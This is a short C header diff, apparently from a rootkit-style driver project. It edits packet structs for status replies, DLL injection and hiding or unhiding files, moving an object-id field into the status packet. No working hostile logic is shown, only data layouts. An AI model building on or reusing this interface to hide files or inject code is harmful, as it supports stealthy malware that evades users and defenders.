@@ -29,6 +29,7 @@ typedef struct _but_status_packet {
 	SIZE_T szAdditionalDataSize;
 	union {
 		BOOLEAN bState;
+		ULONG uObjectId;
 	} info;
 } BUT_STATUS_PACKET, * PBUT_STATUS_PACKET;
 
@@ -45,7 +46,6 @@ typedef struct _but_dll_injection_packet {
 
 typedef struct _but_hide_file_packet {
 	WCHAR wFullPath[512];
-	ULONG uObjectId;
 } BUT_HIDE_FILE_PACKET, * PBUT_HIDE_FILE_PACKET;
 
 typedef struct _but_unhide_file_packet {
